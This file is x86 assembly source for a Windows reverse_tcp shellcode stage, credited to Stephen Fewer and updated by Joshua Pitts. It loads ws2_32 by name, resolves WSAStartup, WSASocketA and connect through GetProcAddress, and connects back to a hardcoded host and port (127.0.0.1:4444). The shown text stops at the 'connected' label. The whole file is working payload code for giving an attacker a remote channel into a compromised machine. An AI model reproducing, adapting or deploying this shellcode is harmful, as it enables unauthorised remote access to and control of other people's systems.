;-----------------------------------------------------------------------------;
; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)
; Compatible: Windows 7, 2008, Vista, 2003, XP, 2000, NT4
; Version: 1.0 (24 July 2009)
; Updated by: Joshua Pitts (May 30 2014) for loadliba shellcode
;-----------------------------------------------------------------------------;
[BITS 32]


; ebx location of LoadLibraryA
; ecx location of GetProcAddress


reverse_tcp:
  push 0x00003233        ; Push the bytes 'ws2_32',0,0 onto the stack.
  push 0x5F327377        ; ...
  push esp               ; Push a pointer to the "ws2_32" string on the stack.
  xchg esi,ecx            ; mov getprocaddress to esi loadlibA smashing ecx
  call dword [ebx]

  push 0x00007075       ; Push the bytes 'WSAStartup' onto the stack
  push 0x74726174       ; ...
  push 0x53415357       ; ...
  push ESP              ; Push a pointer to the 'WSAStartup' string on the stack
  push EAX              ; handle to ws2_32
  xchg edi,EAX           ; move ws2_32 handle to edi for future use
  call dword [esi]      ; GetProcAddress(ws2_32, WSAStartup)
  xchg ebp, EAX          ; mov wsastartup addr to ebp

  mov eax, 0x0190        ; EAX = sizeof( struct WSAData )
  sub esp, eax           ; alloc some space for the WSAData structure
  push esp               ; push a pointer to this stuct
  push eax               ; push the wVersionRequested parameter
  call ebp               ; WSAStartup( 0x0190, &WSAData );
  ;eax should be zero on great success
  
  ;Need to get WSASocketA address
  push 0x00004174       ; Push WSASocketA
  push 0x656b636f       ; ...
  push 0x53415357       ; ...
  push ESP              ; Push a pointer to WSASocketA
  push EDI              ; Push the handle for ws2_32
  call dword [esi]      ; GetProcAddress(ws2_32, WSASocketA)

  xchg ebp, eax          ; Move WSASocketA address to EBP
  xor eax, eax          ; zero out eax  
  push eax               ; Push zero for the flags param.
  push eax               ; push null for reserved parameter
  push eax               ; we do not specify a WSAPROTOCOL_INFO structure
  push eax               ; we do not specify a protocol
  inc eax                ;
  push eax               ; push SOCK_STREAM
  inc eax                ;
  push eax               ; push AF_INET
  ;push 0xE0DF0FEA        ; hash( "ws2_32.dll", "WSASocketA" )
  call ebp               ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
  xchg ebp, eax          ; save the socket for later, don't care about the value of eax after this

;Good to here
; Need 'connect' address
; Calling getproc address smashes the following regs: EAX, ECX, EDX, ESP
  push 0x00746365        ; Push 'connect'
  push 0x6e6e6f63        ; ...
  push esp               ; Push pointer to 'connect'
  push edi               ; Push handle for ws2_32
  call dword [esi]       ; GetProcAddress(ws2_32, connect)
  xchg ecx, ebp           ; Put socket in ecx
  xchg ebp, eax           ; put address for connect in ebp

set_address:
  push byte 0x05         ; retry counter
  push 0x0100007F        ; host 127.0.0.1
  push 0x5C110002        ; family AF_INET and port 4444
  mov edx, esp           ; save pointer to sockaddr struct
  
try_connect:
  push byte 16           ; length of the sockaddr struct
  push edx               ; pointer to the sockaddr struct
  push ecx               ; the socket
  ;push 0x6174A599        ; hash( "ws2_32.dll", "connect" )
  xchg edi, ecx           ; move socket to edi
  call ebp               ; connect( s, &sockaddr, 16 );

  test eax,eax           ; non-zero means a failure
  
  jz short connected

;handle_failure:
;  dec dword [edx+8]
;  jnz short try_connect

failure:
; LoadLibA is in EBX and GetprocessAddress is in ESI
; socket is in EDI MUST BE GOING OUT
; No need to exit.
;kernel32.dll!ExitProcess
  ;push 0x0
  ;push 0x32336c65         ; Push kernel32 on the stack
  ;push 0x6e72656b         ; ...
  ;push esp                ; Push a pointer to the "kernel32" string on the ;stack.
  ;call dword [ebx]        ; handle for kernel32 now in eax
  ;xchg eax, ebx           ; handle now in ebx
;
  ;
  ;push 0x00737365        ; ExitProcess
  ;push 0x636f7250        ; ...
  ;push 0x74697845        ; ...
  ;push esp               ; Push pointer to ExitThread on stack
  ;push ebx               ; Push kernel32 handle on stack
  ;call dword [esi]       ; getprocaddr(Kernel32.dll, ExitThread)
;
  ;push 0
  ;call eax

connected:
